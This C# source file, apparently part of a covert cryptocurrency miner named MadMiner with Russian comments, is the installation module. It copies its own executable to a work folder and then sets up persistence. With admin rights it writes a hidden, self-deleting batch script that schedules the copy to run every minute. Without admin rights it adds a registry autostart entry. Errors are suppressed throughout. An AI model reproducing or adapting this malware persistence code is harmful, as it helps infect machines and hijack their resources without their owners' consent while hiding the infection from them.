using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;

namespace MadMiner
{
    internal class Install
    {
        public static void GetInstall()
        {

            // Проверка есть ли Settings.workname
            if (Directory.Exists(Settings.workPatch))
            {
            }

            // Файла нету
            else
            {
                try
                {
                    DirectoryInfo workPatch;
                    workPatch = Directory.CreateDirectory(Settings.workPatch);
                    Directory.CreateDirectory(Settings.workPatch);
                    workPatch.Refresh();
                    File.Copy(Assembly.GetExecutingAssembly().Location, Settings.workPatch + "\\" + Settings.workname + ".exe");

                    if (RunCheck.TestAdmin())
                    {
                        // Если админ права получили то пишемся в Планировщик задач
                        try
                        {
                            string cmd = Path.GetTempFileName() + ".cmd";
                            using (StreamWriter sw = new StreamWriter(cmd))
                            {
                                sw.WriteLine("@echo off"); // скрываем консоль
                                sw.WriteLine("timeout 4 > NUL"); // Задержка до выполнения следуюющих команд
                                sw.WriteLine("schtasks.exe " + "/create /f /sc MINUTE /mo 1 /tn " + @"""" + Settings.workname + @"""" + " /tr " + @"""'" + Settings.workPatch + "\\" + Settings.workname + ".exe" + @"""'"); // Прыгаем в планировщик
                                sw.WriteLine("CD " + Path.GetTempPath()); // Переходим во временную папку юзера
                                sw.WriteLine("DEL " + "\"" + cmd + "\"" + " /f /q"); // Удаляем cmd

                            }


                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = cmd,
                                CreateNoWindow = true,
                                ErrorDialog = false,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });

                            // Можем выходить сразу планировщик запустит билд
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                    else
                    {
                        // Админ прав нет, прописываемся в автозагрузку через реестр
                        try
                        {
                                // Строка путь есть, берем ее пишем в реестр
                                Registration.Inizialize(true, Settings.workname, Settings.workPatch + "\\" + Settings.workname + ".exe");
                        }
                        catch { }

                        try
                        {
                            // Стартуем билд сами
                            Process.Start(Settings.workPatch + "\\" + Settings.workname + ".exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                catch { }

            }
        }
    }
}
